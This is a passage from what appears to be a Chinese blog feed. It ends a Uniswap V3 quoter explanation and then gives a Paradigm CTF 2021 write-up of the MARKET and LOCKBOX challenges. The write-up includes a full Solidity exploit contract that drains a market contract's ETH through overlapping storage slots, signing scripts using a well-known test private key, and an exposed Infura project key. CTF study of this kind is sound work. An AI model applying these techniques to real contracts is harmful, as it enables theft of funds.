&#123;<br>    if (reason.length != 32) &#123; // swap 函数正常 revert 的情况<br>        if (reason.length &lt; 68) revert(&#x27;Unexpected error&#x27;);<br>        assembly &#123;<br>            reason := add(reason, 0x04)<br>        &#125;<br>        revert(abi.decode(reason, (string)));<br>    &#125;<br>    return abi.decode(reason, (uint256)); // 这里捕获前面回调函数保存在内存中的结果。<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：通过 <code>try/catch</code> 结合回调函数，模拟计算结果，实现了交易预计算的功能，这样 uniswap 前端就能够在获取用户输入后进行交易的预计算了，这部分前端的实现在<a href="https://github.com/Uniswap/uniswap-interface/blob/3aa045303a4aeefe4067688e3916ecf36b2f7f75/src/hooks/useBestV3Trade.ts#L36">这里</a>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;交易过程&quot;&gt;&lt;a href=&quot;#交易过程&quot; class=&quot;headerlink&quot; title=&quot;交易过程&quot;&gt;&lt;/a&gt;交易过程&lt;/h1&gt;&lt;p&gt; &lt;code&gt;SwapRouter&lt;/code&gt; 合约中封装了面向用户的交易接口：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;e</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Writeup | Paradigm CTF 2021 Part two</title>
    <link href="http://example.com/2022/09/23/ParadigmCTF2021two/"/>
    <id>http://example.com/2022/09/23/ParadigmCTF2021two/</id>
    <published>2022-09-22T16:22:51.000Z</published>
    <updated>2022-09-22T16:38:57.987Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://sissice.github.io/2022/09/18/ParadigmCTF2021one/">Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog</a></p><h2 id="MARKET"><a href="#MARKET" class="headerlink" title="MARKET"></a>MARKET</h2><p>要解决该合约的要求是：让Market合约所有的ETH都消失</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() external view returns (bool) &#123;<br>    return address(market).balance == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>在constructor中，一共使用5+10+15+20=50 ether，铸造了4枚NFT，并且拥有者地址不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint tokenCost = 5 ether;<br>for (uint i = 0; i &lt; 4; i++) &#123;<br>    market.mintCollectibleFor&#123;value: tokenCost&#125;(address(bytes20(keccak256(abi.encodePacked(address(this), i)))));<br>    tokenCost += 5 ether;<br>&#125;<br></code></pre></td></tr></table></figure><p>初步想法是将NFT卖给market，清空market的余额</p><p>但是sellCollectible中对tokenOwner有限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sellCollectible(bytes32 tokenId) public payable &#123;<br>    require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);<br><br>    (, address tokenOwner, address approved, ) = cryptoCollectibles.getTokenInfo(tokenId);<br>    require(msg.sender == tokenOwner, &quot;sellCollectible/not-owner&quot;);<br>    require(approved == address(this), &quot;sellCollectible/not-approved&quot;);<br><br>    cryptoCollectibles.transferFrom(tokenId, msg.sender, address(this));<br><br>    msg.sender.transfer(tokenPrices[tokenId]);<br>&#125;<br></code></pre></td></tr></table></figure><p>EternalStorage用来存储状态，合约中为了节省gas使用assembly，等效于以下结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(bytes32 =&gt; TokenInfo) tokens;<br><br>struct TokenInfo &#123;<br>    bytes32 displayName; //slot0<br>    address owner;  //slot1<br>    address approved;  //slot2<br>    address metadata;  //slot3<br>&#125;<br></code></pre></td></tr></table></figure><p>而我们需要向EVM写数据，就需要满足msg.sender==owner 或者 msg.sender==tokenOwner的要求</p><p>正常来说<a href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">mapping的存储位置</a>无法让两个tokenId的结构体存在部分重叠</p><p>但是在实际的assembly中选择了以下方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">case 0xa9fde064 &#123; // updateName(bytes32,bytes32)<br>    let tokenId := calldataload(0x04)<br>    let newName := calldataload(0x24)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(tokenId, newName) //SSTORE从堆栈中弹出两个值，首先是32字节的key，其次是32字节的value，并将该值存储在由key定义的指定存储槽中<br>&#125;<br>case 0x9711a543 &#123; // updateOwner(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newOwner := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 1), newOwner)<br>&#125;<br>case 0xbdce9bde &#123; // updateApproval(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newApproval := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 2), newApproval)<br>&#125;<br>case 0x169dbe24 &#123; // updateMetadata(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newMetadata := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 3), newMetadata)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以试图操纵tokenId的数值，让两个tokenId的结构体存在部分重叠，即让tokenId_1的slot_1刚好位于tokenId_0的slot_3</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tokenId_0<span class="hljs-selector-class">.name</span>     <br>tokenId_0<span class="hljs-selector-class">.owner</span>   <br>tokenId_0<span class="hljs-selector-class">.approval</span>      -  tokenId_1<span class="hljs-selector-class">.name</span><br>tokenId_0<span class="hljs-selector-class">.metadata</span>      -  tokenId_1<span class="hljs-selector-class">.owner</span><br>-  tokenId_1<span class="hljs-selector-class">.approval</span><br>-  tokenId_1.metadata<br></code></pre></td></tr></table></figure><p>这样我们就可以通过tokenId_0.metadata来设置tokenId_1.owner</p><p>而mint函数中生成的tokenId是随机的，不能通过这个函数生成我们想要的tokenId</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address tokenOwner) external returns (bytes32) &#123;<br>    require(minters[msg.sender], &quot;mint/not-minter&quot;);<br><br>    bytes32 tokenId = keccak256(abi.encodePacked(address(this), tokenIdSalt++));<br>    eternalStorage.mint(tokenId, &quot;My First Collectible&quot;, tokenOwner);<br>    return tokenId;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是有一个最大的漏洞在于调用sellCollectible，sell一个token的时候，直接给出tokenId，然后用该tokenId作为从存储中取值的key获取整个tokenInfo，不会验证这个NFT是否被铸造过。因此我们可以虚构一个tokenId_1, 满足上面的关系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getTokenInfo(bytes32 tokenId) external view returns (bytes32, address, address, address) &#123;<br>    return (<br>        eternalStorage.getName(tokenId),<br>        eternalStorage.getOwner(tokenId),<br>        eternalStorage.getApproval(tokenId),<br>        eternalStorage.getMetadata(tokenId)<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>由于sellCollectible函数中要求价格大于0，所以不能出售我们自己虚构的token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);<br></code></pre></td></tr></table></figure><p>所以进行两次tokenId的数值的更改，将tokenId_0出售两次</p><ol><li>铸造一个tokenId_0，并更改metadata为攻击合约地址</li><li>出售tokenId_0</li><li>虚构tokenId_1，tokenId的值为 token_0+2 （此时tokenId_1.owner=tokenId_0.metadata=攻击合约地址）</li><li>更改tokenId_1.name为攻击合约地址（此时tokenId_0.approval=tokenId_1.name=攻击合约地址）</li><li>将tokenId_0 transferFrom 给攻击合约</li><li>再次出售</li></ol><p>注意，由于要求是让Market合约所有的ETH都消失，而代币价格不等于发送的以太币数量</p><p>所以我们选择设定一个较高的tokenPrices，并在第二次出售之前计算Market合约缺失的tokenPrices</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.7.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract marketExploit &#123;<br>    marketSetup public setup;<br>    EternalStorageAPI public eternalStorage;<br>    CryptoCollectibles public token;<br>    CryptoCollectiblesMarket public market;<br>    constructor(address _setup) payable &#123;<br>        setup = marketSetup(_setup);<br>        eternalStorage = setup.eternalStorage();<br>        token = setup.token();<br>        market = setup.market();<br>        require(msg.value == 70 ether);<br>        bytes32 token_0 = market.mintCollectibleFor&#123;value: 70 ether&#125;(address(this));<br>        //修改token_0.metadata, 让它等于address(this)<br>        eternalStorage.updateMetadata(token_0,address(this));<br>        //approve token<br>        token.approve(token_0, address(market));<br>        //卖出该token_0, tokenId为token_0<br>        market.sellCollectible(token_0);<br>        //get token_1<br>        bytes32 token_1 = bytes32(uint256(token_0)+2);<br>        //updateName-&gt;approval<br>        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));<br>        // transferFrom<br>        token.transferFrom(token_0, address(market), address(this));<br>        token.approve(token_0, address(market));<br>        //fix price<br>        uint tokenPrice = msg.value * 10000 / (10000 + 1000);<br>        uint missingBalance = tokenPrice - address(market).balance;<br>        //补偿缺少的ETH<br>        market.mintCollectible&#123;value:missingBalance&#125;();<br>        //sellAgain<br>        market.sellCollectible(token_0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="LOCKBOX"><a href="#LOCKBOX" class="headerlink" title="LOCKBOX"></a>LOCKBOX</h2><p>利用modifier，套娃</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier _() &#123;<br>    _;<br><br>    assembly &#123;<br>        //第一步：拿到全局变量Stage, 判断如果stage的值没有更新则返回<br>        let next := sload(next_slot)<br>        if iszero(next) &#123;<br>            return(0, 0)<br>        &#125;<br><br>        //第二步：调用Stage上的getSelector()函数，将结果存储在内存中<br>        // keccak(abi.encode(&quot;getSelector&quot;))[0:0x04] = 0x034899bc<br>        mstore(0x00, 0x034899bc00000000000000000000000000000000000000000000000000000000)<br>        pop(call(gas(), next, 0, 0, 0x04, 0x00, 0x04))<br><br>        //第三步：调用Stage合约，函数选择器为getSelector()函数的返回值，参数为CALLDATA[0x04:]<br>        calldatacopy(0x04, 0x04, sub(calldatasize(), 0x04))<br>        switch call(gas(), next, 0, 0, calldatasize(), 0, 0)<br>            //第四步：如果调用失败，则REVERT<br>            case 0 &#123;<br>                returndatacopy(0x00, 0x00, returndatasize())<br>                revert(0x00, returndatasize())<br>            &#125;<br>            case 1 &#123;<br>                returndatacopy(0x00, 0x00, returndatasize())<br>                return(0x00, returndatasize())<br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>Entrypoint</code>to等到<code>Stage1</code>to <code>Stage2</code>，<code>Stage5</code>我们会将相同的 calldata 传递给所有调用。所以一个 calldata 解决题中的6个条件</p><h3 id="Entrypoint"><a href="#Entrypoint" class="headerlink" title="Entrypoint"></a>Entrypoint</h3><p>随机数预测，传入 <code>bytes4(blockhash(block.number - 1))</code> 即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(bytes4 guess) public _ &#123;<br>    require(guess == bytes4(blockhash(block.number - 1)), &quot;do you feel lucky?&quot;);<br><br>    solved = true;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Stage1"><a href="#Stage1" class="headerlink" title="Stage1"></a>Stage1</h3><p>需要获得 <code>0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf</code> 的私钥，这是一个非常出名的地址，其私钥为：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint8 v, bytes32 r, bytes32 s) public _ &#123;<br>    require(ecrecover(keccak256(&quot;stage1&quot;), v, r, s) == 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, &quot;who are you?&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：在一般的web3.js中，在eth-sign时，会在签名的消息前加上<code>\x19Ethereum Signed Message + len(msg)</code>一段bytecode。故需使用不加入此消息的eth-sign函数库。</p><p>起初使用we3py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> eth_account <span class="hljs-keyword">import</span> Account, messages<br><span class="hljs-keyword">from</span> eth_account.messages <span class="hljs-keyword">import</span> encode_defunct<br><br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3, HTTPProvider<br><br>rpc = <span class="hljs-string">&quot;https://mainnet.infura.io/v3/0aec7fd42e0a40f28dd6c1a185f7d3e6&quot;</span><br>web3 = Web3(HTTPProvider(rpc))<br><br>messageshash = web3.toHex(web3.sha3(text=<span class="hljs-string">&#x27;stage1&#x27;</span>))<br><span class="hljs-built_in">print</span>(messageshash)<br>private_key_hex = <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span><br><br>signed_message = Account.signHash(message_hash=messageshash, private_key=private_key_hex)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;signature =&quot;</span>, signed_message)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r = &quot;</span>, web3.toHex(signed_message.r))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s = &quot;</span>, web3.toHex(signed_message.s))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v = &quot;</span>, web3.toHex(signed_message.v))<br><br><br></code></pre></td></tr></table></figure><p>计算得出结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">370</span>df<span class="hljs-number">20998</span>cc<span class="hljs-number">15</span>afb<span class="hljs-number">44</span>c<span class="hljs-number">2879</span>a<span class="hljs-number">3</span>c<span class="hljs-number">162</span>c<span class="hljs-number">92</span>e<span class="hljs-number">703</span>fc<span class="hljs-number">4194527</span>fb<span class="hljs-number">6</span>ccf<span class="hljs-number">30532</span>ca<span class="hljs-number">1</span>dd<span class="hljs-number">3</span>b<br><span class="hljs-attribute">s</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">35</span>b<span class="hljs-number">3</span>f<span class="hljs-number">2</span>e<span class="hljs-number">2</span>ff<span class="hljs-number">583</span>fed<span class="hljs-number">98</span>ff<span class="hljs-number">00813</span>ddc<span class="hljs-number">7</span>eb<span class="hljs-number">17</span>a<span class="hljs-number">0</span>ebfc<span class="hljs-number">282</span>c<span class="hljs-number">011946</span>e<span class="hljs-number">2</span>ccbaa<span class="hljs-number">9</span>cd<span class="hljs-number">3</span>ee<span class="hljs-number">67</span><br><span class="hljs-attribute">v</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">1</span>b<br></code></pre></td></tr></table></figure><p>但是由于此结果不能满足Stage3</p><p>所以使用原始ecdsaSign来签名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethereumjs_util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;ethereumjs-util&quot;</span>);<br><span class="hljs-keyword">const</span> &#123; randomBytes &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; ecdsaSign &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethereum-cryptography/secp256k1&#x27;</span>)<br><br><span class="hljs-keyword">const</span> privateKeyStr = <span class="hljs-string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>;<br><span class="hljs-keyword">const</span> hashStr = <span class="hljs-string">&#x27;0x&#x27;</span> + (ethereumjs_util.keccak(Buffer.from(<span class="hljs-string">&#x27;stage1&#x27;</span>), <span class="hljs-number">256</span>)).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br><span class="hljs-keyword">const</span> privateKey = Buffer.from(privateKeyStr.slice(<span class="hljs-number">2</span>), <span class="hljs-string">&quot;hex&quot;</span>);<br><span class="hljs-keyword">const</span> hash = Buffer.from(hashStr.slice(<span class="hljs-number">2</span>), <span class="hljs-string">&quot;hex&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-comment">// node_modules /@types/secp256k1/index.d.ts</span><br>  <span class="hljs-keyword">const</span> &#123; signature, recid &#125; = ecdsaSign(hash, privateKey, &#123; <span class="hljs-attr">data</span>: randomBytes(<span class="hljs-number">32</span>) &#125;);<br><br>  v = recid + <span class="hljs-number">27</span>;<br>  r = Buffer.from(signature.slice(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br>  s = Buffer.from(signature.slice(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>))<br><br>  <span class="hljs-keyword">if</span> (v != <span class="hljs-number">28</span>) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> rBN = <span class="hljs-string">&#x27;0x&#x27;</span> + r.toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  <span class="hljs-keyword">const</span> sBN = <span class="hljs-string">&#x27;0x&#x27;</span> + s.toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br>  <span class="hljs-comment">// stage3 require: out of order</span><br>  <span class="hljs-keyword">if</span> (sBN &lt; rBN) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// // stage3 require: this is a bit odd</span><br>  <span class="hljs-keyword">if</span> (sBN.slice(-<span class="hljs-number">2</span>) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + v.toString(<span class="hljs-number">16</span>));<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + r.toString(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + s.toString(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><br></code></pre></td></tr></table></figure><p>得到答案</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>c<br><span class="hljs-attribute">r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>f<span class="hljs-number">9</span>c<span class="hljs-number">5510565172835329</span>f<span class="hljs-number">4</span>e<span class="hljs-number">0107</span>b<span class="hljs-number">3</span>af<span class="hljs-number">787</span>bf<span class="hljs-number">46</span>d<span class="hljs-number">1690</span>f<span class="hljs-number">7</span>e<span class="hljs-number">81</span>aba<span class="hljs-number">39</span>e<span class="hljs-number">47</span>c<span class="hljs-number">9940</span>d<span class="hljs-number">43</span><br><span class="hljs-attribute">s</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">95</span>dc<span class="hljs-number">6553997968</span>a<span class="hljs-number">1</span>be<span class="hljs-number">6</span>cc<span class="hljs-number">8</span>ae<span class="hljs-number">66</span>dc<span class="hljs-number">1730</span>cd<span class="hljs-number">1965</span>f<span class="hljs-number">8</span>b<span class="hljs-number">3</span>e<span class="hljs-number">7114</span>ca<span class="hljs-number">0</span>f<span class="hljs-number">9</span>df<span class="hljs-number">15</span>fc<span class="hljs-number">3</span>e<span class="hljs-number">98</span><br></code></pre></td></tr></table></figure><h3 id="Stage2"><a href="#Stage2" class="headerlink" title="Stage2"></a>Stage2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint16 a, uint16 b) public _ &#123;<br>    require(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; a + b &lt; a, &quot;something doesn&#x27;t add up&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>取了 2个 storage的uint 。</p><h3 id="Stage3"><a href="#Stage3" class="headerlink" title="Stage3"></a>Stage3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint idx, uint[4] memory keys, uint[4] memory lock) public _ &#123;<br>    require(keys[idx % 4] == lock[idx % 4], &quot;key did not fit lock&quot;);<br><br>    for (uint i = 0; i &lt; keys.length - 1; i++) &#123;<br>        require(keys[i] &lt; keys[i + 1], &quot;out of order&quot;);<br>    &#125;<br><br>    for (uint j = 0; j &lt; keys.length; j++) &#123;<br>        require((keys[j] - lock[j]) % 2 == 0, &quot;this is a bit odd&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时的slot部署是这样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">slot0</span>    idx      guess v  <br><span class="hljs-attribute">slot1</span>    keys[<span class="hljs-number">0</span>]        r  <br><span class="hljs-attribute">slot2</span>    keys[<span class="hljs-number">1</span>]        s <br><span class="hljs-attribute">slot3</span>    keys[<span class="hljs-number">2</span>]          <br><span class="hljs-attribute">slot4</span>    keys[<span class="hljs-number">3</span>]             <br><span class="hljs-attribute">slot5</span>    lock[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">slot6</span>    lock[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>这里有三个条件</p><ol><li><p>keys[idx % 4] == lock[idx % 4]</p><p>由于idx = 0xff1c，所以idx % 4 = 0</p><p>即keys[0] == lock[0]</p></li><li><p>keys[i] &lt; keys[i + 1]</p><p>要求呈递增排列</p></li><li><p>(keys[j] - lock[j]) % 2 == 0</p><p>对应位置的差值必须是偶数，两个偶数相减肯定是偶数，两个奇数相减肯定也是偶数。</p></li></ol><h3 id="Stage4"><a href="#Stage4" class="headerlink" title="Stage4"></a>Stage4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(bytes32[6] choices, uint choice) public _ &#123;<br>    require(choices[choice % 6] == keccak256(abi.encodePacked(&quot;choose&quot;)), &quot;wrong choice!&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>要求在前6块slot中部署一个abi.encodePacked(“choose”) </p><p>这里还剩下slot3和slot4为空</p><p>由于需要满足差值为偶数，所以只能放在slot4</p><h3 id="Stage5"><a href="#Stage5" class="headerlink" title="Stage5"></a>Stage5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve() public _ &#123;<br>    require(msg.data.length &lt; 256, &quot;a little too long&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>要求整个data的长度不能超过256</p><p>所以综上，得出攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 